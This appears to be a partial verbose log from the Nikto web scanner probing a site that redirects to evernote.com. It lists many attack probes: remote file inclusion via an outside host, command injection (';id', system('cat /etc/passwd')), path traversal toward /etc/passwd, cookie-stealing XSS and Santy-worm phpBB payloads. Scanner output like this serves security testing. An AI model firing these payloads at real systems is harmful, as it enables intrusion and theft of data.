+V:Mon Sep 25 16:27:17 2023 - 404 for GET:	/cgi-bin/webdist.cgi
+V:Mon Sep 25 16:27:17 2023 - 404 for GET:	/DB4Web/10.10.10.10:100
+V:Mon Sep 25 16:27:18 2023 - 404 for GET:	/ews/ews/architext_query.pl
+V:Mon Sep 25 16:27:19 2023 - 404 for GET:	/exec/show/config/cr
+V:Mon Sep 25 16:27:20 2023 - 404 for GET:	/instantwebmail/message.php
+V:Mon Sep 25 16:27:21 2023 - 404 for GET:	/cfdocs/snippets/gettempdirectory.cfm
+V:Mon Sep 25 16:27:21 2023 - 404 for GET:	/admin.php?en_log_id=0&action=config
+V:Mon Sep 25 16:27:22 2023 - 404 for GET:	/admin.php?en_log_id=0&action=users
+V:Mon Sep 25 16:27:23 2023 - 404 for GET:	/admin.php4?reg_login=1
+V:Mon Sep 25 16:27:24 2023 - 404 for GET:	/admin/admin_phpinfo.php4
+V:Mon Sep 25 16:27:25 2023 - 404 for GET:	/admin/login.php?action=insert&username=test&password=test
+V:Mon Sep 25 16:27:26 2023 - 404 for GET:	/interscan/cgi-bin/FtpSave.dll?I'm%20Here
+V:Mon Sep 25 16:27:26 2023 - 404 for GET:	/ext.ini.%00.txt
+V:Mon Sep 25 16:27:27 2023 - 404 for GET:	/dostuff.php?action=modify_user
+V:Mon Sep 25 16:27:28 2023 - 404 for GET:	/accounts/getuserdesc.asp
+V:Mon Sep 25 16:27:28 2023 - 308 for GET:	/Admin/
+V:Mon Sep 25 16:27:29 2023 - 404 for GET:	/achievo/atk/javascript/class.atkdateattribute.js.php?config_atkroot=http://cirt.net/rfiinc.txt?
+V:Mon Sep 25 16:27:30 2023 - 404 for GET:	/agentadmin.php
+V:Mon Sep 25 16:27:31 2023 - 404 for GET:	/b2-include/b2edit.showposts.php?b2inc=http://cirt.net/rfiinc.txt?&cmd=ls
+V:Mon Sep 25 16:27:32 2023 - 404 for GET:	/catalog/includes/include_once.php?include_file=http://cirt.net/rfiinc.txt?
+V:Mon Sep 25 16:27:32 2023 - 404 for GET:	/errors/needinit.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt?
+V:Mon Sep 25 16:27:33 2023 - 404 for GET:	/sqldump.sql
+V:Mon Sep 25 16:27:34 2023 - 404 for GET:	/structure.sql
+V:Mon Sep 25 16:27:35 2023 - 404 for GET:	/servlet/SessionManager
+V:Mon Sep 25 16:27:36 2023 - 404 for GET:	/php.ini
+V:Mon Sep 25 16:27:36 2023 - 404 for GET:	/SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator
+V:Mon Sep 25 16:27:37 2023 - 404 for GET:	/ip.txt
+V:Mon Sep 25 16:27:38 2023 - 404 for GET:	/eIYdId.cfm?mode=debug
+V:Mon Sep 25 16:27:39 2023 - 404 for GET:	/level/42/exec/show%20conf
+V:Mon Sep 25 16:27:40 2023 - 308 for GET:	/livehelp/
+V:Mon Sep 25 16:27:41 2023 - 308 for GET:	/LiveHelp/
+V:Mon Sep 25 16:27:42 2023 - 404 for GET:	/logicworks.ini
+V:Mon Sep 25 16:27:42 2023 - 404 for GET:	/login.jsp
+V:Mon Sep 25 16:27:43 2023 - 404 for GET:	/logins.html
+V:Mon Sep 25 16:27:44 2023 - 404 for GET:	/logs/str_err.log
+V:Mon Sep 25 16:27:45 2023 - 404 for GET:	/mall_log_files/order.log
+V:Mon Sep 25 16:27:46 2023 - 404 for GET:	/mambo/administrator/phpinfo.php
+V:Mon Sep 25 16:27:46 2023 - 404 for GET:	/megabook/files/20/setup.db
+V:Mon Sep 25 16:27:47 2023 - 404 for GET:	/modules.php?name=Members_List&sql_debug=1
+V:Mon Sep 25 16:27:48 2023 - 404 for GET:	/myinvoicer/config.inc
+V:Mon Sep 25 16:27:49 2023 - 404 for GET:	/officescan/hotdownload/ofscan.ini
+V:Mon Sep 25 16:27:50 2023 - 404 for GET:	/order/order_log_v12.dat
+V:Mon Sep 25 16:27:51 2023 - 404 for GET:	/order/order_log.dat
+V:Mon Sep 25 16:27:51 2023 - 404 for GET:	/orders/order_log_v12.dat
+V:Mon Sep 25 16:27:52 2023 - 404 for GET:	/Orders/order_log_v12.dat
+V:Mon Sep 25 16:27:53 2023 - 404 for GET:	/orders/order_log.dat
+V:Mon Sep 25 16:27:54 2023 - 404 for GET:	/Orders/order_log.dat
+V:Mon Sep 25 16:27:55 2023 - 404 for GET:	/PDG_Cart/shopper.conf
+V:Mon Sep 25 16:27:56 2023 - 404 for GET:	/phorum/admin/stats.php
+V:Mon Sep 25 16:27:56 2023 - 404 for GET:	/php-coolfile/action.php?action=edit&file=config.php
+V:Mon Sep 25 16:27:57 2023 - 404 for GET:	/phpBB/phpinfo.php
+V:Mon Sep 25 16:27:58 2023 - 404 for GET:	/pmlite.php
+V:Mon Sep 25 16:27:59 2023 - 404 for GET:	/session/admnlogin
+V:Mon Sep 25 16:28:00 2023 - 404 for GET:	/settings/site.ini
+V:Mon Sep 25 16:28:00 2023 - 404 for GET:	/SiteScope/htdocs/SiteScope.html
+V:Mon Sep 25 16:28:01 2023 - 404 for GET:	/soapdocs/ReleaseNotes.html
+V:Mon Sep 25 16:28:02 2023 - 404 for GET:	/ssdefs/siteseed.dtd
+V:Mon Sep 25 16:28:03 2023 - 400 for GET:	/servlet/allaire.jrun.ssi.SSIFilter
+V:Mon Sep 25 16:28:03 2023 - 404 for GET:	/pp.php?action=login
+V:Mon Sep 25 16:28:04 2023 - 404 for GET:	/isapi/count.pl?
+V:Mon Sep 25 16:28:05 2023 - 308 for GET:	/krysalis/
+V:Mon Sep 25 16:28:06 2023 - 404 for GET:	/logjam/showhits.php
+V:Mon Sep 25 16:28:06 2023 - 404 for GET:	/manual.php
+V:Mon Sep 25 16:28:07 2023 - 404 for GET:	/mods/apage/apage.cgi?f=file.htm.|id|
+V:Mon Sep 25 16:28:08 2023 - 404 for GET:	/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid
+V:Mon Sep 25 16:28:09 2023 - 404 for GET:	/nuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid
+V:Mon Sep 25 16:28:09 2023 - 308 for GET:	/perl/-e%20%22system('cat%20/etc/passwd');\%22
+V:Mon Sep 25 16:28:10 2023 - 404 for GET:	/phpnuke/html/.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid
+V:Mon Sep 25 16:28:11 2023 - 404 for GET:	/phpnuke/modules.php?name=Network_Tools&file=index&func=ping_host&hinput=%3Bid
+V:Mon Sep 25 16:28:12 2023 - 308 for GET:	/Program%20Files/
+V:Mon Sep 25 16:28:12 2023 - 404 for GET:	/smssend.php
+V:Mon Sep 25 16:28:14 2023 - 404 for GET:	/pls/simpledad/admin_/dadentries.htm
+V:Mon Sep 25 16:28:14 2023 - 404 for POST:	/Mem/dynaform/Login.htm?WINDWEB_URL=%2FMem%2Fdynaform%2FLogin.htm&ListIndexUser=0&sWebParam1=admin000
+V:Mon Sep 25 16:28:16 2023 - 404 for GET:	/ncl_items.html
+V:Mon Sep 25 16:28:17 2023 - 404 for GET:	/ncl_items.shtml?SUBJECT=1
+V:Mon Sep 25 16:28:18 2023 - 404 for GET:	/photo/manage.cgi
+V:Mon Sep 25 16:28:19 2023 - 404 for GET:	/photodata/manage.cgi
+V:Mon Sep 25 16:28:19 2023 - 404 for GET:	/pub/english.cgi?op=rmail
+V:Mon Sep 25 16:28:20 2023 - 404 for GET:	/pvote/ch_info.php?newpass=password&confirm=password%20
+V:Mon Sep 25 16:28:21 2023 - 404 for GET:	/scripts/wsisa.dll/WService=anything?WSMadmin
+V:Mon Sep 25 16:28:22 2023 - 404 for GET:	/SetSecurity.shm
+V:Mon Sep 25 16:28:23 2023 - 404 for GET:	/submit?setoption=q&option=allowed_ips&value=255.255.255.255
+V:Mon Sep 25 16:28:23 2023 - 404 for GET:	/thebox/admin.php?act=write&username=admin&password=admin&aduser=admin&adpass=admin
+V:Mon Sep 25 16:28:24 2023 - 404 for GET:	/servlet/admin?category=server&method=listAll&Authorization=Digest+username%3D%22admin%22%2C+response%3D%22ae9f86d6beaa3f9ecb9a5b7e072a4138%22%2C+nonce%3D%222b089ba7985a883ab2eddcd3539a6c94%22%2C+realm%3D%22adminRealm%22%2C+uri%3D%22%2Fservlet%2Fadmin%22&
+V:Mon Sep 25 16:28:25 2023 - 404 for GET:	/shopadmin.asp
+V:Mon Sep 25 16:28:26 2023 - 404 for GET:	/modsecurity.php?inc_prefix=http://cirt.net/rfiinc.txt?
+V:Mon Sep 25 16:28:27 2023 - 404 for GET:	/phpBB2/includes/db.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
+V:Mon Sep 25 16:28:27 2023 - 404 for GET:	/<script>alert('Vulnerable')</script>
+V:Mon Sep 25 16:28:28 2023 - 404 for GET:	/_vti_bin/shtml.exe/junk_nonexistant.exe
+V:Mon Sep 25 16:28:29 2023 - 308 for GET:	/_vti_txt/_vti_cnf/
+V:Mon Sep 25 16:28:29 2023 - 308 for GET:	/_vti_txt/
+V:Mon Sep 25 16:28:30 2023 - 404 for GET:	/_vti_pvt/deptodoc.btr
+V:Mon Sep 25 16:28:31 2023 - 404 for GET:	/_vti_pvt/doctodep.btr
+V:Mon Sep 25 16:28:32 2023 - 404 for GET:	/_vti_pvt/services.org
+V:Mon Sep 25 16:28:32 2023 - 411 for POST:	/_vti_bin/shtml.dll/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611
+V:Mon Sep 25 16:28:32 2023 - 411 for POST:	/_vti_bin/shtml.exe/_vti_rpc?method=server+version%3a4%2e0%2e2%2e2611
+V:Mon Sep 25 16:28:33 2023 - 411 for POST:	/_vti_bin/_vti_aut/author.dll?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=false
+V:Mon Sep 25 16:28:33 2023 - 411 for POST:	/_vti_bin/_vti_aut/author.exe?method=list+documents%3a3%2e0%2e2%2e1706&service%5fname=&listHiddenDocs=true&listExplorerDocs=true&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=true&listIncludeParent=true&listDerivedT=false&listBorders=false
+V:Mon Sep 25 16:28:34 2023 - 404 for GET:	/_vti_bin/_vti_aut/dvwssr.dll
+V:Mon Sep 25 16:28:35 2023 - 404 for GET:	/_vti_bin/_vti_aut/fp30reg.dll?xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+V:Mon Sep 25 16:28:36 2023 - 404 for GET:	/_vti_bin/_vti_aut/fp30reg.dll
+V:Mon Sep 25 16:28:37 2023 - 404 for GET:	/_vti_pvt/access.cnf
+V:Mon Sep 25 16:28:37 2023 - 404 for GET:	/_vti_pvt/botinfs.cnf
+V:Mon Sep 25 16:28:38 2023 - 404 for GET:	/_vti_pvt/bots.cnf
+V:Mon Sep 25 16:28:39 2023 - 404 for GET:	/_vti_pvt/service.cnf
+V:Mon Sep 25 16:28:40 2023 - 404 for GET:	/_vti_pvt/services.cnf
+V:Mon Sep 25 16:28:41 2023 - 404 for GET:	/_vti_pvt/svacl.cnf
+V:Mon Sep 25 16:28:41 2023 - 404 for GET:	/_vti_pvt/writeto.cnf
+V:Mon Sep 25 16:28:42 2023 - 404 for GET:	/_vti_pvt/linkinfo.cnf
+V:Mon Sep 25 16:28:43 2023 - 308 for GET:	/manager/
+V:Mon Sep 25 16:28:43 2023 - 308 for GET:	/jk-manager/
+V:Mon Sep 25 16:28:44 2023 - 308 for GET:	/jk-status/
+V:Mon Sep 25 16:28:44 2023 - 308 for GET:	/admin/
+V:Mon Sep 25 16:28:45 2023 - 308 for GET:	/host-manager/
+V:Mon Sep 25 16:28:47 2023 - 404 for GET:	/isx.html
++ /file/../../../../../../../../etc/ - Redirects (302) to https://evernote.com/etc/ , The Icecast server allows the file system to be probed for directory structure, but does not allow arbitrary file retrieval.
+- STATUS: Completed 1500 requests (~22% complete, 1.3 hours left): currently in plugin 'Nikto Tests'
+- STATUS: Running average: Not enough data.
++ /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc - Redirects (307) to / , EW FileManager for PostNuke allows arbitrary file retrieval.
++ /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc/&view=passwd - Redirects (307) to / , EW FileManager for PostNuke allows arbitrary file retrieval.
++ /index.php?err=3&email=\"><script>alert(document.cookie)</script> - Redirects (307) to / , MySQL Eventum is vulnerable to XSS in the email field.
++ /index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?Nikto=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?name=Forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?Nikto=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?name=forums&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?name=PNphpBB2&file=viewtopic&t=2&rush=%64%69%72&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?Nikto=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?Nikto=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?name=forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /index.php?name=PNphpBB2&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527 - Redirects (307) to / , phpBB is vulnerable to a highlight command execution or SQL injection vulnerability, used by the Santy.A worm.
++ /../webserver.ini - Redirects (302) to https://evernote.com/webserver.ini , Nuca WebServer allows retrieval of the web server configuration.
++ ../../../../../../../../../../etc/* - Redirects (302) to https://evernote.com/etc/* , Charles Steinkuehler's LEAF sh-httpd allows remote users to read any file or directory on the system. XF-13519, http://www.securityfocus.com/bid/8897
++ ../../../../../../../../../../etc/passw* - Redirects (302) to https://evernote.com/etc/passw* , Charles Steinkuehler's LEAF sh-httpd allows remote users to read any file or directory on the system. XF-13519, http://www.securityfocus.com/bid/8897
++ /index.php?vo=\"><script>alert(document.cookie);</script> - Redirects (307) to / , Ralusp Sympoll 1.5 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ /../config.dat - Redirects (302) to https://evernote.com/config.dat , Directory traversal and config.dat suggests NetServe web server and default admin folder. This file contains the administrative login/pass.
++ /index.php?showforum=1&prune_day=100&sort_by=Z-A&sort_key=[sqlgoeshere] - Redirects (307) to / , Invision Power Board 2.0alpha3 and before are vulnerable to an SQL injection attack.
++ /index.php?offset=[%20Problem%20Here%20] - Redirects (307) to / , Invision Power Top Site List 1.1 contains an SQL injection vulnerability.
+- STATUS: Completed 2000 requests (~29% complete, 1.4 hours left): currently in plugin 'Nikto Tests'
+- STATUS: Running average: Not enough data.
+- STATUS: Completed 2500 requests (~36% complete, 1.3 hours left): currently in plugin 'Nikto Tests'
+- STATUS: Running average: Not enough data.
++ /index.php?topic=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;%20 - Redirects (307) to / , This might be interesting... has been seen in web logs from an unknown scanner.
++ ////../../data/config/microsrv.cfg - Redirects (302) to https://evernote.com/data/config/microsrv.cfg , Xerox WorkCentre allows any file to be retrieved remotely.
++ ////////../../../../../../etc/passwd - Redirects (302) to https://evernote.com/etc/passwd , Xerox WorkCentre allows any file to be retrieved remotely.
++ OSVDB-3233: /netbasic/websinfo.bas: Novell Netware 5.1 contains Novonyx default files which reveal system information. All default files should be removed.
++ /index.php - Redirects (307) to / , PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ /index.php - Redirects (307) to / , PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+- STATUS: Completed 3000 requests (~43% complete, 1.1 hours left): currently in plugin 'Nikto Tests'
+- STATUS: Running average: Not enough data.
++ OSVDB-6659: /c0OffEO4EiX2Ebn1BbHk2fP8GoazrFwnHY775PzRVhDUNHZg8afNQxDRT1Ovcc8eldF8Tv57ZMY7nep5vbvfKTjGyukbIRD9p55CnzzqWywzgW6bIeE3oO7zs1AsQQmEAAckuxQu4AcBno7fwhD2zpSUfaY3HGqIcuVBOEDF7i0ZtB5loDKGq9gE4kYuO60KetSgTLhpnfAeSxSTHwli1sYOntWvvKo<font%20size=50><script>alert(11)</script><!--//--: MyWebServer 1.0.2 is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
